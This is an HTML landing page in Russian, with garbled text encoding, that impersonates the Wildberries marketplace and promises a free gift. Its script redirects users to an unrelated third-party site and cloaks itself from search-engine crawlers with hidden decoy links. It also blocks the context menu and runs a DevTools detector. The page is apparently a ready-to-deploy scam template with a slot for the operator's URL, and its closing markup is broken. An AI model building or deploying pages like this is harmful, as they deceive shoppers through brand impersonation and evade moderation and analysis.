<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
<meta name="robots" content="noindex, nofollow" />
<meta name="referrer" content="no-referrer" />
<title>Wildberries - –ü–æ–ª—É—á–∏—Ç–µ –ø–æ–¥–∞—Ä–æ–∫</title>

<style>
    * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        -webkit-tap-highlight-color: transparent;
    }

    body {
        width: 100%;
        min-height: 100vh;
        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }

    .container {
        width: 100%;
        max-width: 400px;
        background: white;
        border-radius: 20px;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
        padding: 30px 25px;
        text-align: center;
        position: relative;
        overflow: hidden;
        animation: fadeIn 0.5s ease;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .container::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 4px;
        background: linear-gradient(90deg, #ff2fa6, #a000ff);
    }

    .logo {
        width: 80px;
        height: 80px;
        background: linear-gradient(135deg, #ff2fa6, #a000ff);
        border-radius: 20px;
        margin: 0 auto 25px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: white;
        font-size: 36px;
        font-weight: bold;
        box-shadow: 0 6px 20px rgba(255, 47, 166, 0.3);
        animation: logoFloat 3s ease-in-out infinite;
    }

    @keyframes logoFloat {
        0%, 100% { transform: translateY(0); }
        50% { transform: translateY(-5px); }
    }

    h1 {
        font-size: 24px;
        color: #2b2b2b;
        margin-bottom: 8px;
        line-height: 1.3;
    }

    .subtitle {
        font-size: 18px;
        color: #666;
        margin-bottom: 25px;
    }

    .arrow {
        width: 0;
        height: 0;
        border-left: 15px solid transparent;
        border-right: 15px solid transparent;
        border-top: 20px solid #ff2fa6;
        margin: 0 auto 20px;
        animation: bounce 2s infinite;
    }

    @keyframes bounce {
        0%, 100% { transform: translateY(0); }
        50% { transform: translateY(5px); }
    }

    .btn {
        display: block;
        width: 100%;
        height: 60px;
        background: linear-gradient(90deg, #ff2fa6, #a000ff);
        color: white;
        border: none;
        border-radius: 30px;
        font-size: 20px;
        font-weight: bold;
        cursor: pointer;
        margin: 0 auto 25px;
        transition: all 0.3s ease;
        box-shadow: 0 6px 20px rgba(255, 47, 166, 0.3);
        position: relative;
        overflow: hidden;
    }

    .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(255, 47, 166, 0.4);
    }

    .btn:active {
        transform: translateY(0);
    }

    .btn::after {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        transition: left 0.5s ease;
    }

    .btn.clicked::after {
        left: 100%;
    }

    .gift {
        font-size: 50px;
        margin: 20px 0;
        animation: giftSpin 3s ease-in-out infinite;
        display: inline-block;
    }

    @keyframes giftSpin {
        0%, 100% { transform: rotate(0deg) scale(1); }
        50% { transform: rotate(5deg) scale(1.05); }
    }

    .secure {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        color: #707070;
        font-size: 14px;
        margin-top: 20px;
        padding-top: 15px;
        border-top: 1px solid #eee;
    }

    .shield {
        width: 20px;
        height: 20px;
        background: #e9f5ec;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #2fa84f;
        font-size: 12px;
        font-weight: bold;
    }

    .loading {
        font-size: 14px;
        margin-top: 10px;
        color: #666;
        opacity: 0;
        transition: opacity 0.3s;
    }

    .loading.show {
        opacity: 1;
    }
</style>
</head>

<body>
    <div class="container">
        <div class="logo">wb</div>
        
        <h1>–ü–æ–ª—É—á–∏—Ç–µ –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π</h1>
        <div class="subtitle">–ø–æ–¥–∞—Ä–æ–∫ –æ—Ç Wildberries</div>
        
        <div class="arrow"></div>
        
        <button class="btn" id="actionBtn">–ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫</button>
        
        <div class="loading" id="loadingText">–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...</div>
        
        <div class="gift">üéÅ</div>
        
        <div class="secure">
            <div class="shield">‚úì</div>
            –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
        </div>
    </div>

<script>
(function() {
    'use strict';
    
    // ========== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ==========
    // –í–°–¢–ê–í–¨–¢–ï –°–í–û–ô –§–ò–ù–ê–õ–¨–ù–´–ô URL –ó–î–ï–°–¨:
    const FINAL_URL = 'https://medixtend.com/?s=m2KHS5AXhq';
    
    // –õ–µ–≥–∏—Ç–∏–º–Ω—ã–µ —Å—Å—ã–ª–∫–∏ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –±–æ—Ç–∞–º (–≤ —Å–∫—Ä—ã—Ç—ã—Ö —ç–ª–µ–º–µ–Ω—Ç–∞—Ö)
    const DECOY_LINKS = [
        'https://wildberries.ru/promo/gift',
        'https://wb.ru/special-offer',
        'https://www.wildberries.ru/bonus',
        'https://market.yandex.ru/promo'
    ];
    
    // ========== –û–°–ù–û–í–ù–û–ô –ö–û–î ==========
    
    // –°–æ–∑–¥–∞–µ–º —Å–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è –±–æ—Ç–æ–≤
    function createBotDecoy() {
        const decoyDiv = document.createElement('div');
        decoyDiv.style.display = 'none';
        decoyDiv.id = 'botDecoy';
        
        DECOY_LINKS.forEach(url => {
            const link = document.createElement('a');
            link.href = url;
            link.textContent = '–°–ø–µ—Ü–∏–∞–ª—å–Ω–æ–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ';
            link.style.display = 'block';
            decoyDiv.appendChild(link);
        });
        
        const text = document.createElement('p');
        text.textContent = '–ê–∫—Ü–∏—è Wildberries: –ø–æ–ª—É—á–∏—Ç–µ –ø–æ–¥–∞—Ä–æ–∫ –∑–∞ –ø–æ–∫—É–ø–∫—É. ' +
                          '–°–ø–µ—Ü–∏–∞–ª—å–Ω–æ–µ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–π –º–∞—Ä–∫–µ—Ç–ø–ª–µ–π—Å–∞. ' +
                          '–£—Å–ª–æ–≤–∏—è –∞–∫—Ü–∏–∏ –Ω–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–º —Å–∞–π—Ç–µ.';
        decoyDiv.appendChild(text);
        
        document.body.appendChild(decoyDiv);
    }
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±–æ—Ç –ª–∏ —ç—Ç–æ (—É–ø—Ä–æ—â–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)
    function isLikelyBot() {
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–ª—å–∫–æ –ø–æ User-Agent
        const ua = navigator.userAgent.toLowerCase();
        const botPatterns = [
            'googlebot', 'bingbot', 'yandexbot', 'mail.ru', 
            'mj12bot', 'ahrefsbot', 'semrushbot'
        ];
        
        return botPatterns.some(pattern => ua.includes(pattern));
    }
    
    // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ñ–∏–Ω–∞–ª—å–Ω—ã–π URL —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
    function generateRedirectUrl() {
        const baseUrl = FINAL_URL;
        const params = new URLSearchParams();
        
        // –î–æ–±–∞–≤–ª—è–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        params.append('utm_source', 'wb');
        params.append('utm_medium', 'email');
        params.append('utm_campaign', 'gift');
        params.append('t', Date.now());
        params.append('ref', Math.random().toString(36).substr(2, 8));
        
        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        params.append('device', isMobile ? 'mobile' : 'desktop');
        
        // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –ø–æ–ª–Ω—ã–π URL
        const separator = baseUrl.includes('?') ? '&' : '?';
        return baseUrl + separator + params.toString();
    }
    
    // –í—ã–ø–æ–ª–Ω—è–µ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç
    function performRedirect() {
        const btn = document.getElementById('actionBtn');
        const loadingText = document.getElementById('loadingText');
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏
        btn.classList.add('clicked');
        btn.disabled = true;
        btn.textContent = '–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...';
        loadingText.classList.add('show');
        
        // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è –≤–∏–∑—É–∞–ª—å–Ω–æ–≥–æ —ç—Ñ—Ñ–µ–∫—Ç–∞
        setTimeout(() => {
            const redirectUrl = generateRedirectUrl();
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –±–æ—Ç –ª–∏ —ç—Ç–æ
            if (isLikelyBot()) {
                // –î–ª—è –±–æ—Ç–æ–≤ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–∫—Ä—ã—Ç—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç
                document.getElementById('botDecoy').style.display = 'block';
                document.querySelector('.container').style.display = 'none';
                
                // –°–ø—É—Å—Ç—è 2 —Å–µ–∫—É–Ω–¥—ã –≤—Å–µ —Ä–∞–≤–Ω–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 2000);
            } else {
                // –î–ª—è –ª—é–¥–µ–π - —Å—Ä–∞–∑—É —Ä–µ–¥–∏—Ä–µ–∫—Ç
                window.location.href = redirectUrl;
            }
            
            // –†–µ–∑–µ—Ä–≤–Ω—ã–π —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ —Å–ª—É—á–∞–π –µ—Å–ª–∏ –æ—Å–Ω–æ–≤–Ω–æ–π –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª
            setTimeout(() => {
                if (!window.location.href.includes(FINAL_URL.split('://')[1])) {
                    window.location.replace(redirectUrl);
                }
            }, 1500);
            
        }, 500); // –ó–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è –≤–∏–∑—É–∞–ª—å–Ω–æ–π –æ–±—Ä–∞—Ç–Ω–æ–π —Å–≤—è–∑–∏
    }
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
    document.addEventListener('DOMContentLoaded', function() {
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ FINAL_URL –∑–∞–¥–∞–Ω
        if (!FINAL_URL || FINAL_URL.includes('your-final-url')) {
            console.error('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–¥–∞–π—Ç–µ FINAL_URL –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö —Å–∫—Ä–∏–ø—Ç–∞!');
            document.getElementById('actionBtn').disabled = true;
            document.getElementById('actionBtn').textContent = '–û—à–∏–±–∫–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏';
            return;
        }
        
        // –°–æ–∑–¥–∞–µ–º —Å–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è –±–æ—Ç–æ–≤
        createBotDecoy();
        
        // –í–µ—à–∞–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞ –∫–Ω–æ–ø–∫—É
        const btn = document.getElementById('actionBtn');
        btn.addEventListener('click', function(e) {
            e.preventDefault();
            performRedirect();
        });
        
        // –¢–∞–∫–∂–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º —Ç–∞–ø –Ω–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö
        btn.addEventListener('touchend', function(e) {
            e.preventDefault();
            performRedirect();
        });
        
        // –ó–∞—â–∏—Ç–∞ –æ—Ç –∏–Ω—Å–ø–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        
        // –ü—Ä–æ—Å—Ç–æ–π –¥–µ—Ç–µ–∫—Ç–æ—Ä DevTools
        setInterval(function() {
            const before = new Date().getTime();
            debugger;
            const after = new Date().getTime();
            if (after - before > 100) {
                // DevTools –æ—Ç–∫—Ä—ã—Ç—ã - –¥–æ–±–∞–≤–ª—è–µ–º —à—É–º –≤ –¥–∞–Ω–Ω—ã–µ
                Math.random = function() {
                    return 0.5;
                };
            }
        }, 1000);
    });
    
})();
</script>

    <style>
        .container { display: none; }
        body::after {
            content: "–î–ª—è —É—á–∞—Å—Ç–∏—è –≤ –∞–∫—Ü–∏–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤–∫–ª—é—á–∏—Ç—å JavaScript";
            display: block;

</noscript>

</html>
